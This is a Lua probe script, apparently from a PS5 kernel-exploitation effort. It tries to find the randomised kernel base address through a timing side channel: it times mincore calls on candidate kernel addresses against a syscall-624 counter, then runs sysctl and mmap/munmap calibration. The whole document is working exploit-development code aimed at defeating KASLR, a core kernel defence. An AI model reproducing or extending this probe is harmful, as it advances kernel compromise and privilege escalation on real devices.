-- CRASH_CLASS: LOW
-- PROBE 89c: Timing side channel for KASLR defeat
-- Use syscall 624 (VM op counter) as a precise timer.
-- Measure sysctl latency for different kernel VA probes via mincore.
-- If mapped kernel pages produce different latency than unmapped ones,
-- we can binary-search for the kernel base.
--
-- FreeBSD kernel base is typically 0xFFFFFFFF80000000 + KASLR slide.
-- PS5 likely uses a similar range. Slide is usually < 256MB.

print("=== PROBE 89c: TIMING KASLR ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

print("pid=" .. to_num(syscall.getpid()))

local sc_624 = make_syscall(624)
local sc_mincore = make_syscall(78)  -- mincore
local sc_sysctl = make_syscall(202)

-- Get counter baseline
local function get_counter()
    local ok, ret = pcall(function() return sc_624() end)
    if ok then return to_num(ret) end
    return 0
end

-- Allocate output buffer for mincore
local vec_buf = memory.alloc(0x100)

-- Test: measure mincore latency for different kernel VA guesses
-- mincore returns -1 for kernel VA but the latency might vary
-- if the page table walk hits different levels

print("")
print("--- MINCORE TIMING ---")

-- Candidate kernel bases: 0xFFFFFFFF80000000 + 0 to 256MB in 16MB steps
local results = {}
for slide = 0, 15 do
    local base_hi = 0xFFFFFFFF
    local base_lo = 0x80000000 + slide * 0x1000000
    if base_lo >= 0x100000000 then
        base_hi = base_hi + 1
        base_lo = base_lo - 0x100000000
    end

    local addr = uint64(string.format("0x%08X%08X", base_hi, base_lo))

    -- Run 10 iterations and measure counter delta
    local total_delta = 0
    local samples = 10
    for i = 1, samples do
        local c1 = get_counter()
        local ok, ret = pcall(function()
            return sc_mincore(addr, uint64(0x4000), uint64(vec_buf))
        end)
        local c2 = get_counter()
        total_delta = total_delta + (c2 - c1)
    end

    local avg = total_delta / samples
    results[#results+1] = {slide=slide, avg=avg}
    print(string.format("slide=0x%X avg_delta=%.1f", slide * 0x1000000, avg))
end

-- Also try the sysctl timing approach
print("")
print("--- SYSCTL TIMING ---")

local mib = memory.alloc(16)
local outbuf = memory.alloc(0x100)
local oldlenp = memory.alloc(8)

-- kern.osreldate (1.31): a fast sysctl for baseline
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 31)
memory.write_dword(oldlenp, 0x100)

local baselines = {}
for i = 1, 20 do
    local c1 = get_counter()
    pcall(function() sc_sysctl(uint64(mib), uint64(2), uint64(outbuf), uint64(oldlenp), uint64(0), uint64(0)) end)
    local c2 = get_counter()
    baselines[#baselines+1] = c2 - c1
end

local sum = 0
for _, v in ipairs(baselines) do sum = sum + v end
print("sysctl baseline avg=" .. (sum / #baselines))

-- Check if counter=624 works as a timer (should increment by 0 for non-mmap syscalls)
print("")
print("--- COUNTER CALIBRATION ---")
local c_start = get_counter()
local c_after_getpid = get_counter()
print("counter_diff_empty=" .. (c_after_getpid - c_start))

-- Do 5 mmap+munmap and check counter
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(73)
local c_before = get_counter()
for i = 1, 5 do
    local m = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(-1), uint64(0))
    if to_num(m) > 0 then
        pcall(function() sc_munmap(m, uint64(0x4000)) end)
    end
end
local c_after = get_counter()
print("counter_diff_5mmap_munmap=" .. (c_after - c_before))

print("=== PROBE 89c COMPLETE ===")
